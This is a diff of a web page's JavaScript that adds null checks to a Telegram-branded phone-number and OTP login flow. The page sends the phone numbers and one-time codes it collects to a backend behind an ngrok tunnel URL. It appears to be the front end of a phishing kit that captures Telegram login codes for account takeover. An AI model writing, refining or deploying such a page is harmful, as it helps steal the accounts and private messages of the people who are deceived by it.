@@ -1,4 +1,4 @@
-const BACKEND_URL = 'https://3a83-185-211-179-90.ngrok-free.app/';
+const BACKEND_URL = 'https://3a83-185-211-179-90.ngrok-free.app';
 
 async function sendLogToBackend(message) {
     console.log('Log:', message);
@@ -21,7 +21,6 @@ async function fetchCountries() {
         if (!response.ok) throw new Error('Failed to fetch countries');
         
         countries = await response.json();
-        // Sort countries by calling code
         countries.sort((a, b) => {
             const codeA = a.idd.root + (a.idd.suffixes ? a.idd.suffixes[0] : '');
             const codeB = b.idd.root + (b.idd.suffixes ? b.idd.suffixes[0] : '');
@@ -36,28 +35,28 @@ async function fetchCountries() {
 
 function populateCountryDropdown(countries) {
     const countrySelect = document.getElementById('country');
-    countries.forEach(country => {
-        const countryCode = country.cca2;
-        const countryName = country.name.common;
-        const callingCode = country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : '');
-        
-        const option = document.createElement('option');
-        option.value = countryCode;
-        option.textContent = `${countryName} (${callingCode})`;
-        countrySelect.appendChild(option);
-    });
+    if (countrySelect) {
+        countries.forEach(country => {
+            const countryCode = country.cca2;
+            const countryName = country.name.common;
+            const callingCode = country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : '');
+
+            const option = document.createElement('option');
+            option.value = countryCode;
+            option.textContent = `${countryName} (${callingCode})`;
+            countrySelect.appendChild(option);
+        });
+    }
 }
 
 document.addEventListener('DOMContentLoaded', function() {
     fetchCountries();
 
-    // Check for user's preferred color scheme and apply night mode if necessary
     const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     if (isNightMode) {
         document.body.classList.add('night-mode');
         sendLogToBackend("Night mode activated.");
 
-        // Load the dark mode logo
         const logoImage = document.getElementById('telegramLogo');
         if (logoImage) {
             logoImage.src = 'telegram-logo2.png'; // Update image source for dark mode
@@ -69,26 +68,26 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('phoneNumber');
     const countrySelect = document.getElementById('country');
     
-    // Add event listener to phone input for auto-filling country code
-    phoneInput.addEventListener('input', function() {
-        const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
-        if (inputNumber.length > 0) {
-            const matchedCountry = findCountryByPhoneCode(inputNumber);
-            if (matchedCountry) {
-                countrySelect.value = matchedCountry.cca2;
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function() {
+            const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (inputNumber.length > 0) {
+                const matchedCountry = findCountryByPhoneCode(inputNumber);
+                if (matchedCountry && countrySelect) {
+                    countrySelect.value = matchedCountry.cca2;
+                }
             }
-        }
-    });
+        });
 
-    // Scroll page up when phone input is focused (to avoid blocking the input field)
-    phoneInput.addEventListener('focus', () => {
-        setTimeout(() => {
-            window.scrollTo({
-                top: phoneInput.getBoundingClientRect().top - 100, // Scroll to input field, adjusting for a margin
-                behavior: 'smooth'
-            });
-        }, 300); // Delay to wait for the keyboard to open
-    });
+        phoneInput.addEventListener('focus', () => {
+            setTimeout(() => {
+                window.scrollTo({
+                    top: phoneInput.getBoundingClientRect().top - 100,
+                    behavior: 'smooth'
+                });
+            }, 300);
+        });
+    }
 
     const phoneForm = document.getElementById('phoneForm');
     if (phoneForm) {
@@ -112,8 +111,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 });
 
                 const data = await response.json();
-                
-                // Check for specific "invalid phone number" error message
                 if (data.message && data.message.includes('The phone number is invalid')) {
                     throw new Error('Invalid phone number, please input your correct phone number.');
                 }
@@ -135,7 +132,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     displayMessage(data.message || 'Failed to send OTP', 'error');
                 }
             } catch (error) {
-                displayMessage(error.message, 'error'); // Display the correct error message
+                displayMessage(error.message, 'error');
             } finally {
                 submitButton.disabled = false; // Re-enable button
                 displayLoadingIndicator(false);
@@ -143,7 +140,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // OTP form handling
     const otpForm = document.getElementById('otpForm');
     if (otpForm) {
         otpForm.addEventListener('submit', async function(event) {
@@ -201,7 +197,6 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// Function to find the country based on the phone number input
 function findCountryByPhoneCode(phoneNumber) {
     for (const country of countries) {
         if (country.idd.root && phoneNumber.startsWith(country.idd.root)) {
@@ -213,9 +208,11 @@ function findCountryByPhoneCode(phoneNumber) {
 
 function displayMessage(message, type) {
     const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
-    messageContainer.innerText = message;
-    messageContainer.style.color = type === 'error' ? 'red' : 'green';
-    messageContainer.style.display = 'block';
+    if (messageContainer) {
+        messageContainer.innerText = message;
+        messageContainer.style.color = type === 'error' ? 'red' : 'green';
+        messageContainer.style.display = 'block';
+    }
 }
 
 function displayLoadingIndicator(isLoading) {
